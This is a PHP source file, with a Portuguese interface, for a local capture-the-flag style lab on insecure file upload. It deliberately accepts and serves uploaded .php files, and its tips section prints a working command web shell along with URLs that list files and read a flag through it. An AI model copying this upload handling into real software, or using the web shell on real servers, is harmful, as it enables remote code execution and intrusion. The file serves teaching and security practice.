<?php
$uploadDir = __DIR__ . '/uploads';
$uploadUrl = '/uploads';
$message = null;
$error = null;
$uploadedFile = null;

if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

function h(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

function listUploadedFiles(string $dir): array
{
    $files = [];
    foreach (scandir($dir) ?: [] as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        if (is_file($dir . '/' . $file)) {
            $files[] = $file;
        }
    }
    sort($files);
    return $files;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        $error = 'Falha no upload. Envie um arquivo válido.';
    } else {
        $originalName = basename($_FILES['file']['name']);
        $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

        // Intencionalmente vulnerável para laboratório.
        // Em sistemas reais, nunca permita upload e execução de arquivos PHP enviados pelo usuário.
        if ($extension !== 'php') {
            $error = 'Este laboratório aceita apenas arquivos .php.';
        } else {
            $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $originalName);
            if ($safeName === '' || $safeName === '.php') {
                $safeName = 'shell.php';
            }

            $targetPath = $uploadDir . '/' . $safeName;

            if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
                chmod($targetPath, 0644);
                $uploadedFile = $safeName;
                $message = 'Upload realizado com sucesso.';
            } else {
                $error = 'Não foi possível salvar o arquivo enviado.';
            }
        }
    }
}

$files = listUploadedFiles($uploadDir);
?>
<!doctype html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Upload RCE Lab - PHP</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111827; color: #f9fafb; margin: 0; }
        .wrap { max-width: 920px; margin: 48px auto; padding: 0 20px; }
        .card { background: #1f2937; border: 1px solid #374151; border-radius: 18px; padding: 28px; box-shadow: 0 20px 60px rgba(0,0,0,.35); }
        h1 { margin-top: 0; }
        label { display: block; margin: 16px 0 6px; color: #d1d5db; }
        input { width: 100%; box-sizing: border-box; border-radius: 10px; border: 1px solid #4b5563; background: #111827; color: #f9fafb; padding: 12px; font-size: 16px; }
        input[type="file"] { padding: 10px; }
        button, .btn { margin-top: 18px; display: inline-block; border: 0; border-radius: 10px; padding: 12px 18px; background: #38bdf8; color: #082f49; font-weight: 700; cursor: pointer; text-decoration: none; }
        code, pre { background: #030712; border: 1px solid #374151; border-radius: 10px; color: #e5e7eb; }
        pre { padding: 14px; overflow-x: auto; }
        .muted { color: #9ca3af; }
        .error { background: #7f1d1d; border: 1px solid #ef4444; padding: 12px; border-radius: 10px; }
        .success { background: #064e3b; border: 1px solid #10b981; padding: 12px; border-radius: 10px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .file-list { margin-top: 12px; padding-left: 20px; }
        .file-list li { margin: 8px 0; }
        .warning { background: #78350f; border: 1px solid #f59e0b; padding: 12px; border-radius: 10px; }
        @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>File Upload RCE Lab - PHP</h1>
        <p class="muted">Laboratório local e intencionalmente vulnerável para estudar upload inseguro de arquivo PHP e execução remota de comandos no container.</p>

        <p class="warning"><strong>Aviso:</strong> use somente em ambiente local ou controlado. Este lab permite executar código enviado pelo usuário.</p>

        <?php if ($message): ?>
            <p class="success"><?= h($message) ?></p>
        <?php endif; ?>

        <?php if ($error): ?>
            <p class="error"><?= h($error) ?></p>
        <?php endif; ?>

        <form method="post" action="/" enctype="multipart/form-data">
            <label for="file">Enviar arquivo PHP</label>
            <input id="file" name="file" type="file" accept=".php">
            <button type="submit">Enviar</button>
        </form>

        <?php if ($uploadedFile): ?>
            <h2>Arquivo enviado</h2>
            <p>Abra o arquivo em:</p>
            <pre><?= h($uploadUrl . '/' . $uploadedFile) ?></pre>
            <a class="btn" href="<?= h($uploadUrl . '/' . rawurlencode($uploadedFile)) ?>" target="_blank" rel="noopener">Abrir arquivo enviado</a>
        <?php endif; ?>

        <h2>Arquivos em uploads</h2>
        <?php if (count($files) > 0): ?>
            <ul class="file-list">
                <?php foreach ($files as $file): ?>
                    <li><a class="btn" href="<?= h($uploadUrl . '/' . rawurlencode($file)) ?>" target="_blank" rel="noopener"><?= h($file) ?></a></li>
                <?php endforeach; ?>
            </ul>
        <?php else: ?>
            <p class="muted">Nenhum arquivo enviado ainda.</p>
        <?php endif; ?>

        <h2>Dicas do laboratório</h2>
        <p>Crie um arquivo chamado <code>shell.php</code> com o conteúdo abaixo:</p>
        <pre>&lt;?php
$cmd = $_GET['cmd'] ?? 'id';
echo '&lt;pre&gt;';
system($cmd);
echo '&lt;/pre&gt;';
?&gt;</pre>

        <p>Depois do upload, execute comandos pela URL:</p>
        <pre>http://localhost:5000/uploads/shell.php?cmd=ls</pre>
        <p>Use <code>ls</code> para localizar o arquivo da flag e depois:</p>
        <pre>http://localhost:5000/uploads/shell.php?cmd=cat%20flag.txt</pre>
    </div>
</div>
</body>
</html>
